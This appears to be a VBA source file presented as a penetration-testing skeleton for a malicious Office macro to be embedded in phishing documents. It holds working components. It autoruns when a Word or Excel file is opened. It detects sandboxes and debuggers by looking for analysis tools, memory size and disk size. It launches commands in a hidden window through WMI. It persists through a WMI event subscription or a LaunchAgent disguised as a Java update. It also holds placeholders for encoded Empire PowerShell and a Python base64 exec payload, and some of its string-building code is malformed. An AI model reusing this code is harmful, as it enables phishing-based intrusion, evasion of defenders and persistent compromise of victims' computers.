'
' RobustPentestMacro.vbs
'
' SYNOPSIS:
'   This is a skeleton code for the malicious Macro that could
'   be used during Penetration Testing assignments (or for education
'   purposes), in order to embed it within Phishing documents as a
'   Microsoft Office macro.
'
'   There are following features implemented:
'   - Sandbox detection - allowing to exit macro when being scanned
'   - WMI Subscription persistence - allowing to survive system restart
'   - Page substitution - for hiding fake "Enable Content" warning
'   - Supporting both MSWORD and EXCEL startup routines
'
'
' QUICK USAGE:
'   Everything that one has to do with this script is to fill up the 
'   Malware() routine and if needed set up constants in CONFIGURATION.
'   One can use for the purpose of filling `Sub Malware()` predefined functions:
'       - CreateNewProcess(command)
'       - CreateNewProcessAndPersist command, startupTaskName
'
'   Finally, one should definitely feed this script into some kind of Visual
'   Basic obfuscator, like this one:
'       https://github.com/mgeeky/VisualBasicObfuscator
'
'   The macro's code has been built up from various building blocks:
'   - https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a
'   - https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d
'   - https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6
'
'
' DISCALIMER:
'   The author of this code is not taking any responsibilities of
'   any illegal usage of it. The code had been created solely for
'   Penetration Testing purposes.
'
'
' AUTHOR:
'   Mariusz B. / mgeeky, '17
'   Shared on GPL license.
'


'
' ================================================================
'   CONFIGURATION
'
' The most essential configuration here is the EXECUTE_COMMAND variable
' that has to contain a command to be launched upon execution. This
' command can be for instance "powershell -noP -sta -w 1 -enc <code>" payload
'
' Further options are documented below and are self-explanatory.
'

' Specifies whether to schedule below command EXECUTE_COMMAND at startup
Const USE_PERSISTENCE = False

' Specifies whether to use Sandbox detection code and exit upon positive
' detection
Const USE_SANDBOX_DETECTION = True


' ================================================================
' REQUIRED BY PAYLOADS SYSTEM API IMPORTS

#If Mac Then
    #If VBA7 Then
        ' 64-bit Mac (2016)
        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "system" _
            (ByVal command As String) As Long
        Private Declare PtrSafe Function fopen Lib "libc.dylib" Alias "fopen" _
            (ByVal file As String, ByVal mode As String) As LongPtr
        Private Declare PtrSafe Function fputs Lib "libc.dylib" Alias "fputs" _
            (ByVal str As String, ByVal file As LongPtr) As Long
        Private Declare PtrSafe Function fclose Lib "libc.dylib" Alias "fclose" _
            (ByVal file As LongPtr) As Long
    #Else
        ' 32-bit Mac
        Private Declare Function system Lib "libc.dylib" Alias "system" _
            (ByVal command As String) As Long
        Private Declare Function fopen Lib "libc.dylib" Alias "fopen" _
            (ByVal file As String, ByVal mode As String) As Long
        Private Declare Function fputs Lib "libc.dylib" Alias "fputs" _
            (ByVal str As String, ByVal file As Long) As Long   
        Private Declare Function fclose Lib "libc.dylib" Alias "fclose" _
            (ByVal file As Long) As Long    
    #End If
#Else
    Private Declare PtrSafe Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean
#End If


Public alreadyLaunched As Integer


' ================================================================
' ATTACKER-SPECIFIC MACRO CODE
'

Private Sub WindowsMalware()
    
    ' ***********************************************
    '
    ' ENTER YOUR *WINDOWS* MALWARE CODE HERE.
    '
    ' You can use following functions as building primitives:
    '   - ExecuteCommand(command)
    '   - ExecuteCommandAndPersist command, startupTaskName
    '
    ' ***********************************************

    Dim payload As String

    #If Win64 Then
        '
        ' **************
        '   HERE COMES Windows x64 PAYLOAD
        ' **************
        '

    #Else

        '
        ' **************
        '   HERE COMES Windows x86 PAYLOAD
        ' **************
        '

    #End If

    Dim Str As String

    ' Example powershell command as generated by Empire windows/macro
    str = "powershell -noP -sta -w 1 -enc  ABCDEFGHIJKLMNOPQ"
    str = str + "ABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"
    ' Rest of the powershell command cut for brevity
    ' [...]
    str = str + "ABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"
    
    ExecuteCommandAndPersist str, ""
End Sub

Private Sub MacMalware()    

    ' ***********************************************
    '
    ' ENTER YOUR *MAC OS X* MALWARE CODE HERE.
    '
    ' You can use following functions as building primitives:
    '   - ExecuteCommand(command)
    '   - ExecuteCommandAndPersist command, startupTaskName
    '
    ' ***********************************************

    Dim cmd As String

    ' Bash command as generated by Empire osx/macro
    cmd = "abcdefghijlmnopqrstuxwyz012345678990"
    cmd = cmd + "abcdefghijlmnopqrstuxwyz012345678990"
    ' Rest of bash command cut for brevity
    ' [...]
    cmd = cmd + "abcdefghijlmnopqrstuxwyz012345678990"
    
    Dim fullCommand As String
    fullCommand = "echo ""import sys,base64;exec(base64.b64decode(\"" " & cmd & " \""));"" | python &"

    ExecuteCommandAndPersist fullCommand, ""
End Sub


' ============================================
' MALWARE PLATFORM-DEPENDENT LAUNCH ROUTINES


Private Sub Malware()
    #If Mac Then
        MacMalware
    #Else
        WindowsMalware
    #End If
End Sub

Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    If USE_SANDBOX_DETECTION = True Then
        If IsRunningInSandbox() Then
            Exit Sub
        End If
    End If
    Malware
    alreadyLaunched = True
End Sub


' ============================================
' EXECUTION ROUTINES


Private Sub ExecuteCommandAndPersist(ByVal str As String, ByVal taskName As String)
    If USE_PERSISTENCE = True Then
        Persistence str, taskName
    End If

    ExecuteCommand (str)
End Sub

Private Sub ExecuteCommand(ByVal str As String)
    #If Mac Then
        ' Mac/BSD/*nix style execute command via system()
        system(str)
    #Else
        ' Windows-style create process via WMI create process object
        Const HIDDEN_WINDOW = 0
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
        objProcess.Create str, Null, objConfig, intProcessID
    #End If
End Sub


' ============================================
' PERSISTENCE RELATED


Private Sub Persistence(ByVal exePath As String, ByVal taskName As String)
    #If Mac Then
        If Len(taskName) = 0 Then
            taskName = "com.java.update"
        End If
        MacPersistence exePath, taskName
    #Else
        If Len(taskName) = 0 Then
            taskName = "JavaUpdateService"
        End If
        WindowsPersistence exePath, taskName
    #End If
End Sub

Sub writeToFile(ByVal file As String, ByVal txt As String)
    #If Mac Then
        #If VBA7 Then
            Dim fp As LongPtr
        #Else
            Dim fp As Long
        #End If

        Dim grants
        grants = Array(file)
        GrantAccessToMultipleFiles(grants)

        fp = fopen(file, "w")
        If fp = 0 Then: Exit Sub

        fputs txt, fp
        fclose(fp)
    #End If
End Sub

Sub MacPersistence(ByVal cmd As String, ByVal taskName As String)
    Dim plist As String
    plist = "<?xml version=""1.0"" encoding=""UTF-8""?>\n"
    plist = plist & "<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD "
    plist = plist & "PLIST 1.0//EN"" ""http://www.apple.com/DTDs/plist"
    plist = plist & " = plist & PropertyList-1.0.dtd"">\n"
    plist = plist & "<plist version=""1.0"">\n
    plist = plist & "<dict>\n"
    plist = plist & "    <key>Label</key>\n"
    plist = plist & "    <string>" & taskName & "</string>\n"
    plist = plist & "    <key>ProgramArguments</key>\n"
    plist = plist & "    <array>\n"
    plist = plist & "        <string>/bin/bash</string>\n"
    plist = plist & "        <string>-c</string>\n"
    plist = plist & "        <string>'" & cmd & "'</string>\n"
    plist = plist & "    </array>\n"
    plist = plist & "    <key>RunAtLoad</key>\n"
    plist = plist & "    <true/>\n"
    plist = plist & "    <key>KeepAlive</key>\n"
    plist = plist & "    <true/>\n"
    plist = plist & "</dict>\n"
    plist = plist & "</plist>\n"

    ' TODO: File writing does not work at the moment, most likely due to 
    '       apps sandboxing mechanism enforced by the system.

    ' Approach #1: File write by system command
    ' system("echo -e """ & plist & """ > ~/Library/LaunchAgents/" & taskName)

    ' Approach #2: File write by fopen+fputs+fclose
    Dim fileName As String
    fileName = "~/Library/LaunchAgents/" & taskName & ".plist"
    writeToFile fileName, plist
End Sub

Public Function WindowsPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    WindowsPersistence = WMIPersistence(exePath, taskName)
End Function

Public Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    ' Windows persistence via WMI filter object creation

    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed

    #If Mac Then
        WMIPersistence = True
        Exit Function
    #End If
    
    filterName = taskName & "Event"
    consumerName = taskName & "Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")
    
    '
    ' Step 1: Set WMI Instance of type Event Filter
    '
    Set objInstances1 = objService1.Get("__EventFilter")

    ' The malware originally will kicks in after roughly 3 minutes since System gets up.
    ' One can modify this delay time by modifying the WHERE clausule of the below query.
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " _
    & "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " _
    & "AND TargetInstance.SystemUpTime >= 200 AND " _
    & "TargetInstance.SystemUpTime < 320"
    
    ' New object of type __EventFilter
    Set newObj1 = objInstances1.SpawnInstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    '
    ' Step 2: Set WMI instance of type: CommandLineEventConsumer
    '
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.SpawnInstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    '
    ' Step 3: Set WMI instance of type: Filter To Consumer Binding
    '
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.SpawnInstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False
End Function


' ============================================
' SANDBOX DETECTION RELATED


Public Function IsRunningInSandbox() As Boolean
    #If Mac Then
        ' This obviously doesn't work under Mac OS X
        IsRunningInSandbox = False
        Exit Function
    #End If

    Dim test As Boolean
    If IsFileNameNotAsHexes() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsProcessListReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    ElseIf IsHardwareReliable() <> True Then
        IsRunningInSandbox = True
        Exit Function
    End If
    IsRunningInSandbox = False
End Function

Public Function IsFileNameNotAsHexes() As Boolean
    Dim str As String
    Dim hexes As Variant
    Dim only_hexes As Boolean
    
    only_hexes = True
    hexes = Array("0", "1", "2", "3", "4", "5", "6", "7", _
                    "8", "9", "a", "b", "c", "d", "e", "f")
    str = ActiveDocument.Name
    str = Mid(str, 1, InStrRev(str, ".") - 1)
    
    For i = 1 To UBound(hexes, 1) - 1
        Dim ch As String
        ch = LCase(Mid(str, i, 1))
        If Not (UBound(Filter(hexes, ch)) > -1) Then
            ' Character not in hexes array.
            only_hexes = False
            Exit For
        End If
    Next
    
    only_hexes = (Not only_hexes)
    IsFileNameNotAsHexes = only_hexes
End Function

Public Function IsProcessListReliable() As Boolean
    Dim objWMIService, objProcess, colProcess
    Dim strComputer, strList
    Dim bannedProcesses As Variant
    
    bannedProcesses = Array("fiddler", "vxstream", _
        "tcpview", "vmware", "procexp", "vmtools", "autoit", _
        "wireshark", "procmon", "idaq", "autoruns", "apatedns", _
        "windbg")
    
    strComputer = "."

    Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
    
    Set colProcess = objWMIService.ExecQuery _
    ("Select * from Win32_Process")
    
    For Each objProcess In colProcess
        For Each proc In bannedProcesses
            If InStr(LCase(objProcess.Name), LCase(proc)) <> 0 Then
                ' Found banned process.
                IsProcessListReliable = False
                Exit Function
            End If
        Next
    Next
    If isDbgPresent() Then
        IsProcessListReliable = False
        Exit Function
    End If
    IsProcessListReliable = (colProcess.Count() > 50)
End Function

Public Function IsHardwareReliable() As Boolean
    Dim objWMIService, objItem, colItems, strComputer
    Dim totalSize, totalMemory, cpusNum As Integer
    
    totalSize = 0
    totalMemory = 0
    cpusNum = 0
    
    Const wbemFlagReturnImmediately = &H10
    Const wbemFlagForwardOnly = &H20

    strComputer = "."
    
    ' Checking total HDD size
    Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colItems = objWMIService.ExecQuery _
    ("Select * from Win32_LogicalDisk")
    
    For Each objItem In colItems
        Dim num
        num = Int(objItem.Size / 1073741824)
        If num > 0 Then
            totalSize = totalSize + num
        End If
    Next
    
    If totalSize < 60 Then
        ' Total HDD size of the machine must be at least 60GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    ' Checking Memory
    Set colComputer = objWMIService.ExecQuery _
    ("Select * from Win32_ComputerSystem")
    
    For Each objComputer In colComputer
        totalMemory = totalMemory + Int((objComputer.TotalPhysicalMemory) / 1048576) + 1
    Next

    If totalMemory < 1024 Then
        ' Total Memory is less than 1GB
        IsHardwareReliable = False
        Exit Function
    End If
    
    Set colItems2 = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL", _
        wbemFlagReturnImmediately + wbemFlagForwardOnly)
        
    For Each objItem In colItems2
        cpusNum = cpusNum + objItem.NumberOfLogicalProcessors
    Next
    
    If cpusNum < 2 Then
        ' Nowadays everyone has at least 2 logical cores.
        IsHardwareReliable = False
        Exit Function
    End If
    
    IsHardwareReliable = True
End Function


' ============================================
' AUTORUNS


Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
